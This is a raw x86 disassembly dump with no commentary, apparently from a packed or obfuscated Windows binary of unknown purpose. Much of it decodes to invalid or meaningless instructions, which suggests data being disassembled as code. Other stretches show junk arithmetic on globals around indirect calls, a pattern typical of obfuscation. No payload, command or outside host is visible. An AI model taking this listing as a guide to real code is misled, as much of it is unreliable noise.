  417aee:	mov    WORD PTR [edi+0x6e],?
  417af1:	and    eax,DWORD PTR [esi]
  417af3:	inc    ebx
  417af4:	xor    dh,BYTE PTR ds:0x6ef537c6
  417afa:	call   0xf862fd05
  417aff:	or     eax,0x2e7822c3
  417b04:	(bad)  
  417b06:	inc    esi
  417b07:	jge    0x417b14
  417b09:	sub    BYTE PTR [esi+0x5cb7ab36],bl
  417b0f:	add    al,0xa9
  417b11:	dec    edx
  417b12:	(bad)  
  417b13:	mov    cl,0xdb
  417b15:	loope  0x417abc
  417b17:	jl     0x417ae4
  417b19:	out    dx,eax
  417b1a:	xchg   ecx,eax
  417b1b:	push   ds
  417b1c:	adc    eax,0x4dc70093
  417b21:	nop
  417b22:	outs   dx,DWORD PTR ds:[esi]
  417b23:	xchg   edx,eax
  417b24:	cwde   
  417b25:	dec    ebx
  417b26:	push   es
  417b27:	mov    edx,DWORD PTR [ebp+0x23116d55]
  417b2d:	jge    0x417ac8
  417b2f:	cmp    eax,0x5e1a10ce
  417b34:	loop   0x417bab
  417b36:	push   ecx
  417b37:	or     BYTE PTR [ecx+0x7c],bh
  417b3a:	mov    BYTE PTR [esi],dh
  417b3c:	and    al,0x3d
  417b3e:	jecxz  0x417af8
  417b40:	(bad)  
  417b41:	xor    bh,BYTE PTR [ebx+0x52]
  417b44:	(bad)  
  417b45:	and    BYTE PTR [edx+0x716d2373],0x6e
  417b4c:	mov    ebp,0xd99de738
  417b51:	adc    eax,0x84fc2c55
  417b56:	mov    edi,0x74fac4bc
  417b5b:	mov    WORD PTR [ecx],?
  417b5d:	push   ebp
  417b5e:	dec    eax
  417b5f:	sub    BYTE PTR [ebx-0x7e97b5b],bh
  417b65:	sahf   
  417b66:	jecxz  0x417b48
  417b68:	pop    esp
  417b69:	xchg   edx,eax
  417b6a:	or     bh,BYTE PTR [ebp-0x1fa61bc3]
  417b70:	xchg   BYTE PTR [ecx+ebx*8+0x6],al
  417b74:	stc    
  417b75:	enter  0xad7c,0x22
  417b79:	jns    0x417bfa
  417b7b:	cmp    DWORD PTR [edx],ecx
  417b7d:	mov    eax,0xece1a8c5
  417b82:	mov    WORD PTR [edx+0x11],es
  417b85:	(bad)  
  417b86:	lods   al,BYTE PTR ds:[esi]
  417b87:	cmp    al,0xd2
  417b89:	adc    al,0x62
  417b8b:	mov    esp,0x98b0b71a
  417b90:	fstp   DWORD PTR ds:[ebx+0x65]
  417b94:	pop    ds
  417b95:	stc    
  417b96:	jns    0x417bfc
  417b98:	adc    ecx,DWORD PTR [edi]
  417b9a:	mov    al,0xd0
  417b9c:	xor    ebx,eax
  417b9e:	fstp   QWORD PTR [ebx-0x41]
  417ba1:	xchg   ecx,eax
  417ba2:	imul   ecx,DWORD PTR [ebx],0xfffffffd
  417ba5:	retf   0xe002
  417ba8:	aas    
  417ba9:	jle    0x417c28
  417bab:	mov    edx,0x120e05cb
  417bb0:	ja     0x417be7
  417bb2:	dec    sp
  417bb4:	mov    dl,BYTE PTR [ebx+0x34]
  417bb7:	and    BYTE PTR [esi-0x6e],ah
  417bba:	pop    ss
  417bbb:	std    
  417bbc:	adc    al,0x1a
  417bbe:	sbb    BYTE PTR [ecx+0x23d2fede],al
  417bc4:	gs sbb eax,0xaef98792
  417bca:	jecxz  0x417bc7
  417bcc:	jg     0x417bc8
  417bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bcf:	icebp  
  417bd0:	scas   al,BYTE PTR es:[edi]
  417bd1:	cld    
  417bd2:	outs   dx,BYTE PTR ds:[esi]
  417bd3:	imul   eax,DWORD PTR [ebp+0x2f053c89],0xf5660113
  417bdd:	(bad)  
  417bde:	dec    esi
  417bdf:	sbb    BYTE PTR ds:0x2d7687fa,dl
  417be5:	nop
  417be6:	jnp    0x417b7f
  417be8:	mov    eax,0x49e63203
  417bed:	sub    eax,0xfb733ad5
  417bf2:	mov    cl,BYTE PTR [ecx+0xf4059ad]
  417bf8:	lds    eax,FWORD PTR [esi]
  417bfa:	outs   dx,BYTE PTR ds:[esi]
  417bfb:	test   eax,0xd3c523e8
  417c00:	jbe    0x417c2f
  417c02:	and    al,0x9d
  417c04:	dec    edx
  417c05:	test   eax,0xc6d6c15c
  417c0a:	sub    dl,bl
  417c0c:	iret   
  417c0d:	sub    ebx,DWORD PTR [ecx]
  417c0f:	inc    eax
  417c10:	dec    esp
  417c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c12:	mov    ah,0x57
  417c14:	adc    DWORD PTR ds:0x32751031,edi
  417c1a:	and    ebx,DWORD PTR [ecx]
  417c1c:	cmp    dl,BYTE PTR gs:[ecx-0x24]
  417c20:	mov    bl,0x5f
  417c22:	xchg   ebx,eax
  417c23:	and    DWORD PTR [ebp+0x22e73b70],ecx
  417c29:	and    al,BYTE PTR [edi+0x53fc1397]
  417c2f:	dec    ecx
  417c30:	or     DWORD PTR [edi+0x1e],0x1f23fb03
  417c37:	adc    DWORD PTR [edi+0x14],eax
  417c3a:	data16 xchg BYTE PTR [ecx],al
  417c3d:	les    edx,FWORD PTR [eax]
  417c3f:	repz cs ror cl,1
  417c43:	inc    edx
  417c44:	stos   DWORD PTR es:[edi],eax
  417c45:	dec    ebp
  417c46:	sbb    dh,BYTE PTR [edi+0x67a80c8]
  417c4c:	adc    BYTE PTR [edi+esi*2+0x58],cl
  417c50:	ja     0x417cba
  417c52:	mov    esi,0x88b58fd
  417c57:	cmp    BYTE PTR [ecx+0x23],ah
  417c5a:	aad    0xb5
  417c5c:	popf   
  417c5d:	dec    eax
  417c5e:	or     eax,0x748990ab
  417c63:	and    al,0x1c
  417c65:	add    DWORD PTR ds:0x428435,0x4dd4
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42857d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x42843d,0x42847d
  417c89:	push   0x4
  417c8b:	push   0x42258c
  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x42844d,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x4284dd,0x0
  417cb2:	mov    DWORD PTR ds:0x428571,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x42844d,0x3679
  417cd7:	cmp    DWORD PTR ds:0x4284dd,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x4284f5
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x42854d
  417d00:	and    DWORD PTR ds:0x42835d,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x42833d
  417d10:	and    DWORD PTR ds:0x42832d,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x428421
  417d1e:	mov    edx,DWORD PTR ds:0x428495
  417d24:	mov    ebx,DWORD PTR ds:0x428511
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x428335,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x4284cd,0x5f12
  417d4c:	mov    DWORD PTR ds:0x428359,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x42844d,edi
  417d61:	cmp    DWORD PTR ds:0x428335,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x428351
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428465,ecx
  417d87:	mov    DWORD PTR ds:0x4284f1,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428569
  417d97:	adc    DWORD PTR ds:0x4284f9,0x890
  417da1:	xor    DWORD PTR ds:0x428365,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x42832d
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417e30
  417ddf:	out    0x1e,al
  417de1:	sahf   
  417de2:	jmp    0x417dca
  417de4:	sar    BYTE PTR [esi-0x41413dcb],0xc7
  417deb:	pop    edx
  417dec:	dec    edx
  417ded:	mov    edi,DWORD PTR [edi]
  417def:	sub    ch,0xb4
  417df2:	mov    al,0x4
  417df4:	test   eax,0xc701775c
  417df9:	in     eax,dx
  417dfa:	pusha  
  417dfb:	(bad)  
  417dfc:	sbb    bh,al
  417dfe:	test   BYTE PTR [ebx-0x2c],ch
  417e01:	xchg   ebp,eax
  417e02:	bsf    edx,DWORD PTR [edx+eiz*8+0x60f1b154]
  417e0a:	inc    esp
  417e0b:	ja     0x417e42
  417e0d:	ds cwde 
  417e0f:	ins    DWORD PTR es:[edi],dx
  417e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e11:	mov    ds:0xd8c999c8,eax
  417e16:	push   ecx
  417e17:	pop    es
  417e18:	pop    esi
  417e19:	cld    
  417e1a:	push   ebp
  417e1b:	mov    edi,0x8ca64ef4
  417e20:	push   edx
  417e21:	or     al,0x9b
  417e23:	inc    edx
  417e24:	sub    BYTE PTR [esi-0x4742938f],dh
  417e2a:	xchg   edx,eax
  417e2b:	push   cs
  417e2c:	xlat   BYTE PTR ds:[ebx]
  417e2d:	test   DWORD PTR ds:0x5c216481,esp
  417e33:	cmp    dl,ah
  417e35:	add    edi,DWORD PTR [eax]
  417e37:	push   cs
  417e38:	mov    esp,0xf34c3c03
  417e3d:	add    esi,ebp
  417e3f:	mov    ebx,0x580a7dee
  417e44:	pop    esp
  417e45:	icebp  
  417e46:	imul   ecx,DWORD PTR [ebp+ebp*4+0x4a754a3b],0x19
  417e4e:	pushf  
  417e4f:	mov    ebp,0x7ca118da
  417e54:	push   edi
  417e55:	(bad)  
  417e57:	add    BYTE PTR [ecx-0x5],0x3d
  417e5b:	(bad)  
  417e5c:	int3   
  417e5d:	hlt    
  417e5e:	ins    BYTE PTR es:[edi],dx
  417e5f:	leave  
  417e60:	or     ecx,0x4c
  417e63:	cwde   
  417e64:	mov    DWORD PTR [ebp+0x1],esp
  417e67:	mov    bl,0xa3
  417e69:	fwait
  417e6a:	adc    edx,DWORD PTR [esi+0x5]
  417e6d:	inc    esp
  417e6e:	add    eax,0x954b21b4
  417e73:	retf   0x9985
  417e76:	lods   al,BYTE PTR ds:[esi]
  417e77:	xchg   ch,dh
  417e79:	test   DWORD PTR [ebx+0x730e0b14],esp
  417e7f:	test   DWORD PTR [esi],eax
  417e81:	and    al,0xf1
  417e83:	sbb    eax,DWORD PTR ds:0xf9d64ef9
  417e89:	ins    BYTE PTR es:[edi],dx
  417e8a:	cmp    BYTE PTR cs:[ebx-0x3ae25087],ch
  417e91:	sub    al,0xdf
  417e93:	add    BYTE PTR [ecx],cl
  417e95:	std    
  417e96:	dec    ebp
  417e97:	mov    bh,0xe1
  417e99:	cmp    dh,BYTE PTR ds:0xc6c2cc44
  417e9f:	sar    edx,cl
  417ea1:	ret    0xa526
  417ea4:	call   ebp
  417ea6:	leave  
  417ea7:	pop    edx
  417ea8:	and    al,0x57
  417eaa:	ret    0x6d3e
  417ead:	jecxz  0x417eb3
  417eaf:	mov    ah,0x69
  417eb1:	test   DWORD PTR [ebx+0x126f2d17],edx
  417eb7:	push   edx
  417eb8:	loope  0x417f36
  417eba:	sub    DWORD PTR [edi-0x45e95576],ebp
  417ec0:	out    0xdd,eax
  417ec2:	call   0xf6dce32f
  417ec7:	sub    al,0xf1
  417ec9:	arpl   WORD PTR [edi+0x30844a35],ax
  417ecf:	(bad)  
  417ed0:	fstp   st(4)
  417ed2:	sar    DWORD PTR [ecx],0x9b
  417ed5:	or     eax,0x5adf992e
  417eda:	int3   
  417edb:	in     al,dx
  417edc:	inc    esi
  417edd:	das    
  417ede:	jp     0x417f06
  417ee0:	push   0xc695447a
  417ee5:	mov    BYTE PTR [edx+ebx*1],bh
  417ee8:	sti    
  417ee9:	inc    esi
  417eea:	shr    DWORD PTR [eax],1
  417eec:	dec    ecx
  417eed:	outs   dx,BYTE PTR ds:[esi]
  417eee:	and    BYTE PTR [ebp+0x55e41fc6],al
  417ef4:	push   edi
  417ef5:	dec    ebx
  417ef6:	mul    BYTE PTR [eax]
  417ef8:	rol    DWORD PTR [edi],1
  417efa:	push   esp
  417efb:	loopne 0x417eba
  417efd:	enter  0x2db9,0x3f
  417f01:	jae    0x417f51
  417f03:	push   0x52fd5af0
  417f08:	jne    0x417ee4
  417f0a:	cwde   
  417f0b:	rcl    DWORD PTR [ecx-0x2572fd36],1
  417f11:	loopne 0x417f92
  417f13:	dec    ebp
  417f14:	and    ecx,DWORD PTR [ebx-0x3ffffe86]
  417f1a:	popa   
  417f1b:	call   0x4f8f54c6
  417f20:	xchg   BYTE PTR [ecx-0x7e92b0e],bh
  417f26:	les    ecx,FWORD PTR [ecx+0x321a5e02]
  417f2c:	pop    ds
  417f2d:	pop    ebx
  417f2e:	pop    esi
  417f2f:	ja     0x417f50
  417f31:	mov    ecx,0x3e8bbb92
  417f36:	xlat   BYTE PTR ds:[ebx]
  417f37:	retf   0x3bf5
  417f3a:	lods   eax,DWORD PTR ds:[esi]
  417f3b:	dec    ebp
  417f3c:	ins    DWORD PTR es:[edi],dx
  417f3d:	gs (bad) 
  417f3f:	push   0x47
  417f41:	xchg   ebx,eax
  417f42:	jle    0x417f95
  417f44:	jne    0x417f78
  417f46:	dec    ebx
  417f47:	dec    eax
  417f48:	rcl    DWORD PTR [ebp-0x2d62fe59],1
  417f4e:	adc    edi,DWORD PTR [edx+0x8d72123]
  417f54:	adc    edx,DWORD PTR [esi+0x569b1853]
  417f5a:	scas   eax,DWORD PTR es:[edi]
  417f5b:	repnz aad 0x75
  417f5e:	cld    
  417f5f:	mov    ecx,DWORD PTR [ebx-0x40]
  417f62:	aam    0x8c
  417f64:	sbb    eax,0xc3e6cf04
  417f69:	call   0x25f1fb
  417f6e:	into   
  417f6f:	sbb    BYTE PTR [ecx-0x10],ah
  417f72:	std    
  417f73:	add    BYTE PTR [esi+ecx*4+0x4],ch
  417f77:	and    BYTE PTR [edi+0x70],bh
  417f7a:	or     ch,BYTE PTR [eax-0x2]
  417f7d:	dec    DWORD PTR [ecx-0x10]
  417f80:	sub    BYTE PTR [eax-0x11baf39e],bh
  417f86:	push   ss
  417f87:	test   BYTE PTR [ecx+0x605ccca1],bl
  417f8d:	scas   eax,DWORD PTR es:[edi]
  417f8e:	mov    cl,dh
  417f90:	daa    
  417f91:	mov    BYTE PTR [ebp+edx*2-0x4f310a8d],ah
  417f98:	adc    DWORD PTR [ebp-0x2ec55cea],esi
  417f9e:	loopne 0x417f27
  417fa0:	addr16 in eax,0xb0
  417fa3:	ficomp DWORD PTR [eax-0x71b5c1d3]
  417fa9:	mov    ebp,0xf903433c
  417fae:	sbb    ebx,DWORD PTR [ebx+ecx*2+0x19]
  417fb2:	int    0x5d
  417fb4:	repnz aam 0x83
  417fb7:	xor    ah,BYTE PTR [ebx]
  417fb9:	(bad)  
  417fbb:	sbb    al,0xf0
  417fbd:	fs mov dl,0x13
  417fc0:	(bad)  
  417fc1:	arpl   WORD PTR [edx-0x3d],dx
  417fc4:	dec    ebx
  417fc5:	or     eax,0x4e53f369
  417fca:	popa   
  417fcb:	jl     0x417f64
  417fcd:	sub    eax,0xfd85f4e4
  417fd2:	iret   
  417fd3:	jge    0x417fea
  417fd5:	out    dx,al
  417fd6:	rcr    DWORD PTR [ebx-0x28ea7845],cl
  417fdc:	push   ecx
  417fdd:	cdq    
  417fde:	dec    esp
  417fdf:	pop    edi
  417fe0:	sub    dl,BYTE PTR [ecx-0x4b97089e]
  417fe6:	push   0xdc8b051
  417feb:	mov    eax,0x22a58d15
  417ff0:	push   cs
  417ff1:	in     al,0xac
  417ff3:	mov    bl,0x11
  417ff5:	inc    ebx
  417ff6:	retf   
  417ff7:	mov    ch,0x5b
  417ff9:	xor    ebx,DWORD PTR [edx-0x4e506f30]
  417fff:	adc    al,0x8d
  418001:	jno    0x418042
  418003:	repnz clc 
  418005:	dec    esp
  418006:	int    0x41
  418008:	in     eax,dx
  418009:	(bad)  
  41800a:	mov    WORD PTR [esi+eiz*2],fs
  41800d:	sbb    al,0xd2
  41800f:	mov    cl,0xb0
  418011:	push   esp
  418012:	jle    0x417f97
  418014:	mov    ecx,0xccfb2831
  418019:	adc    BYTE PTR [ebx-0x23726aa4],bl
  41801f:	jl     0x418020
  418021:	sub    DWORD PTR [ebx+edi*8],esi
  418024:	add    eax,0xc44cf510
  418029:	iret   
  41802a:	lea    eax,[esp+0x98]
  418031:	cmp    DWORD PTR ds:0x42845d,0x0
  418038:	mov    DWORD PTR ds:0x428335,0x1551
  418042:	mov    DWORD PTR ds:0x428545,0x780e
  41804c:	mov    DWORD PTR ds:0x428339,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x428341,edx
  418061:	mov    DWORD PTR ds:0x42833d,0x4140
  41806b:	cmp    DWORD PTR ds:0x42845d,0x0
  418072:	je     0x4180ae
  418078:	push   0x4281f1
  41807d:	push   0x428157
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x428495
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x42853d
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x428405
  4180a1:	adc    DWORD PTR ds:0x428501,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x42844d,edi
  4180ae:	adc    DWORD PTR ds:0x4284d9,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x4283b1
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x428425,ebx
  4180c4:	xor    DWORD PTR ds:0x4284e9,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428465,0x0
  4180d5:	mov    DWORD PTR ds:0x42844d,edx
  4180db:	mov    edx,DWORD PTR ds:0x4284dd
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42857d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428465,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x428411
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428369,ecx
  41810f:	adc    DWORD PTR ds:0x428549,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428475
  418121:	mov    edx,DWORD PTR ds:0x428389
  418127:	mov    ebx,DWORD PTR ds:0x428511
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x428549
  418138:	mov    ebx,DWORD PTR ds:0x4283b9
  41813e:	mov    ecx,DWORD PTR ds:0x4285b9
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x428451,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42857d
  418164:	sub    DWORD PTR ds:0x42845d,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428575,0x0
  418174:	mov    DWORD PTR ds:0x4284dd,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428575,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428475,ebx
  4181b3:	add    DWORD PTR ds:0x428579,0x428441
  4181bd:	mov    ebx,DWORD PTR ds:0x428561
  4181c3:	sbb    ebx,DWORD PTR ds:0x428409
  4181c9:	mov    DWORD PTR ds:0x428561,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x4283ad
  4181d5:	mov    ebx,DWORD PTR ds:0x428529
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x42832d
  4181e6:	and    ebx,DWORD PTR ds:0x428429
  4181ec:	mov    DWORD PTR ds:0x42832d,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x42855d,0x0
  418207:	mov    DWORD PTR ds:0x4284e5,0x564a
  418211:	mov    DWORD PTR ds:0x428465,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x42855d,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x428459
  418252:	adc    DWORD PTR ds:0x42856d,ecx
  418258:	xor    DWORD PTR ds:0x428345,0x4309
  418262:	sub    DWORD PTR ds:0x428375,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	inc    ebx
  41827e:	add    edx,DWORD PTR [edx-0x62]
  418281:	fs jmp 0xbebe:0xc235bec0
  418289:	add    dl,ah
  41828b:	sbb    DWORD PTR [ecx+0x45464762],ecx
  418291:	xchg   ecx,eax
  418292:	or     edi,DWORD PTR [ecx+0x3d]
  418295:	dec    ecx
  418296:	stos   BYTE PTR es:[edi],al
  418297:	push   ecx
  418298:	dec    ebp
  418299:	cmp    BYTE PTR [edi+esi*2-0x28],ch
  41829d:	mov    BYTE PTR [eax],dh
  41829f:	xchg   esi,eax
  4182a0:	mov    eax,ds:0xfd0fed95
  4182a5:	in     eax,dx
  4182a6:	adc    eax,DWORD PTR [edi-0x1745d423]
  4182ac:	and    dh,BYTE PTR [ebx+0x5d]
  4182af:	and    ebx,edx
  4182b1:	ret    0xd9ba
  4182b4:	add    esp,DWORD PTR [eax+0x1]
  4182b7:	cmp    BYTE PTR ds:0x9a88b1ac,dh
  4182bd:	pop    ecx
  4182be:	fldcw  WORD PTR [ebp-0x3]
  4182c1:	call   0x3ba5:0xfb05d3a8
  4182c8:	xchg   ebx,eax
  4182c9:	mov    bh,0xc
  4182cb:	mov    eax,ds:0xf24dcd01
  4182d0:	xchg   ebx,eax
  4182d1:	or     eax,0x7abc193
  4182d6:	ja     0x41828e
  4182d8:	in     al,dx
  4182d9:	xchg   edx,eax
  4182da:	out    0x8,al
  4182dc:	dec    edi
  4182dd:	fs sbb eax,esp
  4182e0:	sbb    ebx,DWORD PTR ds:0xbfa6c2d9
  4182e6:	xchg   edi,eax
  4182e7:	clc    
  4182e8:	inc    eax
  4182e9:	push   ss
  4182ea:	es ds in eax,0xd7
  4182ee:	push   ebx
  4182ef:	dec    edx
  4182f0:	std    
  4182f1:	jnp    0x4182e1
  4182f3:	dec    eax
  4182f4:	mov    dl,0x9a
  4182f6:	sub    eax,0x75c50f7
  4182fb:	call   0x84ce3d58
  418300:	shl    BYTE PTR [eax+0x6a],cl
  418303:	js     0x4182ad
  418305:	sbb    eax,0xaab652bc
  41830a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41830c:	repz or DWORD PTR [edi+edi*8-0x19b31b86],ebx
  418314:	dec    edx
  418315:	inc    ebx
  418316:	rcl    esi,1
  418318:	xor    DWORD PTR ds:0xda8aa5c6,edx
  41831e:	in     eax,dx
  41831f:	or     ah,BYTE PTR [ebx+0x53]
  418322:	push   ebx
  418323:	sub    eax,0xa313dfc1
  418328:	aaa    
  418329:	imul   edi,ebx,0x95ca9c16
  41832f:	cmp    BYTE PTR [edi],ah
  418331:	imul   ecx
  418333:	dec    edi
  418334:	mov    ebp,0x33650dce
  418339:	ins    BYTE PTR es:[edi],dx
  41833a:	mov    edi,0x7a488a3a
  41833f:	inc    esi
  418340:	enter  0x454f,0xe8
  418344:	callw  0xcafb
  418348:	aas    
  418349:	add    edx,esi
  41834b:	js     0x418352
  41834d:	fst    st(2)
  41834f:	ds pop esi
  418351:	sbb    eax,0x4227987f
  418356:	fsubr  DWORD PTR [edi]
  418358:	in     al,0x49
  41835a:	(bad)  
  41835b:	aam    0x4d
  41835d:	repz pushf 
  41835f:	push   esp
  418360:	out    0x7f,eax
  418362:	retf   
  418363:	jnp    0x41838d
  418365:	loope  0x41834f
  418367:	cmp    BYTE PTR [edi-0x44],ch
  41836a:	(bad)  
  41836b:	lahf   
  41836c:	scas   al,BYTE PTR es:[edi]
  41836d:	rol    DWORD PTR ds:0x9702c8ee,1
  418373:	icebp  
  418374:	loop   0x4183ac
  418376:	outs   dx,DWORD PTR ds:[esi]
  418377:	mov    ch,0x78
  418379:	fld    TBYTE PTR [edi]
  41837b:	sbb    al,0x23
  41837d:	cmp    DWORD PTR [esi-0x401f462b],0x72a7a490
  418387:	cmc    
  418388:	ins    BYTE PTR es:[edi],dx
  418389:	repnz inc esi
  41838b:	xor    al,0xed
  41838d:	fwait
  41838e:	push   ebp
  41838f:	hlt    
  418390:	add    al,0x44
  418392:	repnz lds ebx,FWORD PTR [edx-0x4f]
  418396:	xchg   edi,eax
  418397:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  418399:	fnstenv [ebx+edi*2]
  41839c:	repnz add al,0x44
  41839f:	loop   0x41841d
  4183a1:	vmread DWORD PTR [ecx+eax*8+0x3f],ecx
  4183a6:	inc    edx
  4183a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183a8:	xchg   edi,eax
  4183a9:	xchg   esi,esp
  4183ab:	mov    ecx,0xf34b5c3b
  4183b0:	xchg   esi,eax
  4183b1:	fwait
  4183b2:	lea    ebp,[ebp+0x2]
  4183b5:	mov    ds:0x52b8b63d,al
  4183ba:	push   edx
  4183bb:	or     edi,0x1646dd53
  4183c1:	jp     0x4183c4
  4183c3:	sahf   
  4183c4:	jb     0x418420
  4183c6:	sbb    cl,dh
  4183c8:	add    BYTE PTR [ebx],0x5a
  4183cb:	mov    edx,0x9f0c53a4
  4183d0:	lods   eax,DWORD PTR ds:[esi]
  4183d1:	aas    
  4183d2:	inc    esi
  4183d3:	mov    ecx,0x82aa3d7d
  4183d8:	jmp    DWORD PTR [ebx-0x11]
  4183db:	lods   eax,DWORD PTR ds:[esi]
  4183dc:	dec    esp
  4183dd:	loop   0x418402
  4183df:	xchg   ebp,eax
  4183e0:	adc    cl,BYTE PTR [edx]
  4183e2:	lahf   
  4183e3:	push   eax
  4183e4:	inc    edx
  4183e5:	idiv   esi
  4183e7:	and    DWORD PTR [esi],edi
  4183e9:	jecxz  0x41843f
  4183eb:	mov    esp,0x55e61aad
  4183f0:	jmp    0xfa72d1d2
  4183f5:	cli    
  4183f6:	push   cs
  4183f7:	xor    eax,0x8144b059
  4183fc:	aaa    
  4183fd:	pop    ebp
  4183fe:	push   edi
  4183ff:	and    ch,bl
  418401:	xchg   BYTE PTR [ebx-0x5d],bl
  418404:	out    0x18,al
  418406:	mov    al,ds:0xb0f02261
  41840b:	cli    
  41840c:	(bad)  
  41840d:	(bad)  
  41840e:	push   ebp
  41840f:	mov    al,0x52
  418411:	stos   DWORD PTR es:[edi],eax
  418412:	jmp    0x9fb9252
  418417:	or     BYTE PTR [edx-0x71],0xd6
  41841b:	sub    bl,dl
  41841d:	je     0x4183af
  41841f:	in     eax,0x1a
  418421:	loope  0x418441
  418423:	mov    ch,0xd7
  418425:	add    edx,DWORD PTR [edi+0x5c]
  418428:	mov    esp,0x9d4fcd2
  41842d:	(bad)  
  41842e:	cmp    ah,BYTE PTR [ecx]
  418430:	cdq    
  418431:	pop    ds
  418432:	mov    esi,edx
  418434:	mov    ebx,0x89ccca31
  418439:	jo     0x4183d0
  41843b:	ret    
  41843c:	mov    dl,0xdb
  41843e:	cld    
  41843f:	dec    ebx
  418440:	push   esp
  418441:	out    dx,eax
  418442:	data16 int 0x71
  418445:	stos   DWORD PTR es:[edi],eax
  418446:	pop    eax
  418447:	push   ecx
  418448:	pop    es
  418449:	mov    bl,0xf
